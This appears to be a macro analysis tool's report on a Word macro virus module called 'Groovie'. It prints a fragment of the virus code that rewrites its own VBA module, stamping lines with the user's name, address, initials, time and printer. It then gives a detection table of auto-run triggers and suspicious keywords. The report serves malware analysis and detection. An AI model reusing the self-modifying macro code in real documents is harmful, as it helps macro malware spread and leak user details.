 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    I07 = False
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
over:
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Function
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Function I16()
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Randomize
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
rn = Int(Rnd * 999)
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
With Application.VBE.ActiveVBProject.VBComponents("Groovie").CodeModule
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
For x = 2 To 358 Step 2
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
.DeleteLines x
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
.InsertLines x, " ' " & Application.UserInitials & Now & rn & Application.UserName & Application.UserAddress & rn & Application.ActivePrinter
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Next x
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End With
 ' AM07.03.01 10:10:59568Andreas Marx568HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

